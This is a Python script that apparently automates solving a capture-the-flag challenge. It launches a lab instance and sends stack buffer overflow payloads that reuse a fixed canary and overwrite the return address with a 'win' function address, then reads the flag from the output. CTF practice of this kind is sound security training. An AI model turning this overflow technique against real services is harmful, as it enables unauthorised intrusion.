import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/260/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/260/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
WIN = 0x08049236
canary = bytes.fromhex("42695264")


def run(payload, wait=8.0):
    try:
        s = socket.create_connection((host, port), timeout=10)
        s.settimeout(5)
    except Exception:
        return None
    try:
        buf = b""
        while b"> " not in buf:
            c = s.recv(4096)
            if not c:
                break
            buf += c
        s.sendall(str(len(payload)).encode() + b"\n")
        b2 = b""
        while b"Input> " not in b2:
            c = s.recv(4096)
            if not c:
                break
            b2 += c
        # envoyer en plusieurs morceaux pour eviter la lecture partielle
        s.sendall(payload)
        time.sleep(0.2)
        out = b""
        t0 = time.time()
        while time.time() - t0 < wait:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        return out.decode("latin-1", "replace")
    except Exception:
        return None
    finally:
        s.close()


variants = {
    "A: canary + 4 + 4 + win": b"A" * 64 + canary + b"B" * 4 + b"C" * 4 + struct.pack("<I", WIN),
    "B: canary + 8 + win": b"A" * 64 + canary + b"B" * 8 + struct.pack("<I", WIN),
    "C: canary + 4 + win": b"A" * 64 + canary + b"B" * 4 + struct.pack("<I", WIN),
}
for label, pl in variants.items():
    for attempt in range(3):
        r = run(pl)
        if r is None:
            continue
        f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r)
        flag = f.group(0) if f else None
        print("%-28s essai %d -> %s" % (label, attempt + 1, flag if flag else repr(r[:80])))
        if flag:
            sys.exit(0)
